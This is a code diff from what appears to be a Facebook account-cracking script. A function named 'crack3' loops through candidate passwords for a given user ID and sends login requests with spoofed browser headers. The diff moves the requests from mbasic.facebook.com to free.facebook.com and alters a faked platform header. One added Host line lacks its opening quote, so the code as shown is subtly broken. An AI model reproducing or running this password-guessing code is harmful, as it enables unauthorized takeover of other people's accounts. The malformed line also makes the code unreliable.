@@ -686,9 +686,9 @@ def crack3(idf,pwv,nmf):
     for pw in pwv:
         try:
             dat = {}
-            url = ses.get(f"https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin")
+            url = ses.get(f"https://free.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin")
             header = {
-            "Host": "mbasic.facebook.com",
+            "Host": free.facebook.com",
             "connection":"keep-alive",
             "cache-control": "max-age=0",
             "save-data": "on",
@@ -699,14 +699,14 @@ def crack3(idf,pwv,nmf):
             "x-requested-with": "mark.via.gp",
             "dnt": "1","sec-ch-ua":"' Not A;Brand';v='99', 'Chromium';v='99'",
             "sec-ch-ua-mobile":"?1",
-            "sec-ch-ua-platform":"'Android'",
+            "sec-ch-ua-platform":"'Window'",
             "sec-fetch-site": "same-origin",
             "sec-fetch-mode": "cors",
             "sec-fetch-user": "?1",
             "sec-fetch-dest": "document",
             "Upgrade-Insecure-Requests":"1",
             "User-Agent":ua,
-            "referer": "https://mbasic.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin",
+            "referer": "https://free.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin",
             "accept-encoding": "gzip, deflate",
             "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"
             } 
